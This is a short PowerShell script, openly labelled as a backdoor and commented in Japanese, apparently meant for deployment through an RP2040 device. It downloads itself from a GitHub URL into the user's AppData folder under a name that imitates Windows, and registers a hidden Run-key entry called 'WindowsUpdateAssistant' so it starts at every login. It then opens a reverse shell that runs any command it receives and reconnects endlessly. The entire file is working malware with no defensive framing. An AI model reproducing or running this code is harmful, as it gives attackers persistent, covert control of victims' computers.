# --- RP2040 Backdoor (Reverse Shell with Parameter) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

function Start-ReverseShell {
    param(
        [string]$LHOST = "127.0.0.1",
        [int]$LPORT = 4444
    )

    # 1. 永続化（自分自身をコピーして自動起動設定）
    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"
    if (-not (Test-Path $DestPath)) {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
        # 起動時にIPを渡すようにレジストリ登録
        $RegCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT`""
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand
    }

    # 2. リバースシェルの本体
    try {
        $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $Stream = $TCPClient.GetStream()
        $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
        $Reader = New-Object System.IO.StreamReader($Stream)

        $Writer.WriteLine("--- RP2040 Session Established (IP Hidden on GitHub) ---")
        $Writer.Write("PS " + (Get-Location).Path + "> ")

        while($TCPClient.Connected) {
            if($Stream.DataAvailable) {
                $Command = $Reader.ReadLine()
                if ($Command -eq "exit") { break }
                try {
                    $Result = Invoke-Expression $Command 2>&1 | Out-String
                } catch {
                    $Result = $_.Exception.Message
                }
                $Writer.WriteLine($Result)
                $Writer.Write("PS " + (Get-Location).Path + "> ")
            }
            Start-Sleep -Milliseconds 100
        }
        $TCPClient.Close()
    } catch {
        Start-Sleep -Seconds 60
        Start-ReverseShell -LHOST $LHOST -LPORT $LPORT
    }
}
